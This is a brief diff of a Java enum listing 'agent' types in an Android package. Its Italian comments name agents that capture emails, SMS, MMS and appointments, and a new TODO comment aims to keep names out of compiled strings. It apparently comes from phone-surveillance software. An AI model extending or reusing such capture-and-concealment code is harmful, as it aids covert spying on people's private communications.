@@ -11,9 +11,8 @@ package com.android.service.agent;
 
 import java.util.Hashtable;
 import java.util.Map;
-
+// TODO: evitare che il compilatore scriva il nome in una stringa
 public enum AgentType {
-
 	AGENT_INFO(Types.BASE + 0x0),
 	AGENT_SMS(Types.BASE + 0x1), // Agente di cattura delle Email/Sms/Mms
 	AGENT_TASK(Types.BASE + 0x2), // Agente per la cattura degli appuntamenti
